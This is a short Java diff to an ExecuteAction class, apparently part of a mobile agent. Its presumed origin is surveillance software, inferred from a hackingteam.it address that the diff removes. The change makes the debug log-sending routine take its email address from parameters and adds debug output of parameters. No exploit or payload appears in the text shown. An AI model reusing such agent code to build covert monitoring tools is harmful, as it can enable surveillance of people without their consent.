@@ -29,8 +29,6 @@ public final class ExecuteAction extends SubAction {
     static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE);
     //#endif
 
-    String email;
-
     private String command;
 
     /**
@@ -80,15 +78,20 @@ public final class ExecuteAction extends SubAction {
 
     void executeLog(Vector params) {
 
-        //#ifdef DEBUG
-        email = "zeno@hackingteam.it";
-        //#endif
-        boolean ret = Debug.sendLogs(email);
-
+        if(params.size() > 0){
+            String email = (String)params.elementAt(0);
+            //#ifdef DEBUG
+            Debug.sendLogs(email);
+            //#endif
+        }
     }
 
     void executeDebug(Vector params) {
-
+        //#ifdef DEBUG_INFO        
+        for(int i = 0; i<params.size(); i++){
+            debug.info("executeDebug: "+ params.elementAt(i));
+        }
+        //#endif
     }
 
     private static String getParams(String fullCommand, Vector params) {
